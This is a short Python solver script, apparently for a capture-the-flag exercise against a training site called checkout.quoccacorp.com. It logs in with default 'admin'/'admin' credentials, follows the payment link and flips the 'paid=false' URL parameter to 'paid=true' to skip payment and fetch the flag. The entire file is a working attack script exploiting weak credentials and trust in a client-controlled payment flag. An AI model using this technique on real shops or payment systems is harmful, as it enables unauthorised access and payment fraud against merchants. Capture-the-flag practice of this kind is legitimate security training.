import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://checkout.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        response = self.session.post(f"{BASE_URL}/confirm-payment", data={"account": "admin", "password": "admin"}, allow_redirects=False)
        href = BeautifulSoup(response.text, "html.parser").find("a").get("href")
        paid_false_url = f"{BASE_URL}{href}" # https://checkout.quoccacorp.com/pay/quoccapal?paid=false
        paid_true_url = paid_false_url.replace("paid=false", "paid=true")

        response = self.session.get(paid_true_url)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()